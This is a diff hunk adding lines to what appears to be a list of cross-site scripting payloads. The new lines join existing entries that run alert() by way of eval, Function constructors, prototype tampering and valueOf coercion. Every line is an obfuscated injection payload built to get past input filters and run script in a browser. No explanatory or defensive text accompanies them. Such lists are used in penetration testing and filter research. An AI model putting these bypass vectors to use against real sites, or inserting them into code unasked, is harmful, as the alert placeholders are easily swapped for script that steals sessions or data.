@@ -218,3 +218,6 @@ setInterval`alert\x28document.domain\x29`
 x=new class extends Function{}('alert(1)');x=new x;
 eval(Symbol(')-alert(1').toString())
 Function('){alert()//', '')();
+delete []['__proto__']['toString'];[]['__proto__'][Symbol.toStringTag]='=alert(1)';eval([1,2,3]+'');
+({' \'(){alert(1)}})[` \`]()
+-{valueOf(){alert`:D`}}
